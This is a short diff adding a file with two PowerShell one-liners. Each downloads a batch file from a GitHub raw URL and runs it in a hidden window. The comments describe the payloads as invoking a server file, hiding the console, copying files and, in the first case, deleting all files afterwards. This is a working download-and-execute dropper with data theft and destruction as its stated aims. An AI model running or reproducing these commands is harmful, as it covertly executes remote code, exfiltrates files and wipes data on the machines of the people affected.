@@ -1,0 +1,11 @@
+ // INVOVE SERVER FILE, HIDE CONSOLE ... AND COPY FILES AND DELETE ALL FILES AFTER
+
+ powershell (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/MANUEL1518/c4c4s/master/c4c4s.bat','c4.bat'); powershell -windowstyle hidden -command cmd /c call c4.bat;
+
+ // END
+
+ // INVOVE SERVER FILE, HIDE CONSOLE ... AND COPY FILES
+
+ powershell (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/MANUEL1518/c4c4s/master/c4c4.bat','c4.bat'); powershell -windowstyle hidden -command cmd /c call c4.bat;
+
+ // END
